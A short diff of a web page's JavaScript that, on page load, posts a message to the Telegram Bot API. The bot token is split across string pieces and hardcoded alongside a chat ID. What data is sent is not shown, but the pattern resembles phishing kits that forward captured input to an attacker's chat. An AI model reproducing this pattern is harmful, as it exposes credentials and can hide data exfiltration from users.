@@ -16,7 +16,7 @@ document.addEventListener("DOMContentLoaded", function() {
         // Telegram API URL (replace with your bot token and your webhook URL)
 
         const botToken = '6540909143' +  ':AAGOFruojCtkKLFvuCu' + 'IveW9d_0TxCfnmgs';
-        const chatId = '5534302320';  // Your Telegram chat ID
+        const chatId = 5534302320;  // Your Telegram chat ID
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         fetch(url, {
